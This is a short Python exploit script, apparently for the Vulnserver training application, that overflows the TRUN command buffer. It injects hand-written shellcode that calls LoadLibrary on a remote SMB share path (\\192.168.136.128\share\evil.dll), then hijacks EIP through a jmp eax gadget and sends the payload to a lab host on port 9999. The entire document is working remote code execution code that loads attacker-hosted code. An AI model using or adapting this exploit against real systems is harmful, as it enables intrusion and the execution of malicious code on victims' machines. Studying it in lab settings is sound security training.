# Exploit for Vulnserver - TRUN - DLL Side-loading
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

load_library  = "\x83\xEC\x64"            # sub esp,0x64
load_library += "\x31\xDB"                # xor ebx,ebx
load_library += "\x53"                    # push ebx
load_library += "\x68\x2E\x64\x6C\x6C"    # push 0x6c6c642e --\
load_library += "\x68\x65\x76\x69\x6C"    # push 0x6c697665   |
load_library += "\x68\x61\x72\x65\x5C"    # push 0x5c657261   |
load_library += "\x68\x38\x5C\x73\x68"    # push 0x68735c38   |-- \\192.168.136.128\share\evil.dll
load_library += "\x68\x36\x2E\x31\x32"    # push 0x32312e36   |
load_library += "\x68\x38\x2E\x31\x33"    # push 0x33312e38   |
load_library += "\x68\x32\x2E\x31\x36"    # push 0x36312e32   |
load_library += "\x68\x5C\x5C\x31\x39"    # push 0x39315c5c --/
load_library += "\x54"                    # push esp
load_library += "\xBB\x7B\x1D\x80\x7C"    # mov ebx,0x7c801d7b
load_library += "\xFF\xD3"                # call ebx

cmd   = "TRUN /.:/"
junk1 = "\x90" * (2003-100)
junk2 = "\x90" * (100-len(load_library))
eip   = "\x0c\x10\x40"                    # 0x0040100c : jmp eax in vulnserver.exe

buffer = cmd + junk1 + load_library + junk2 + eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
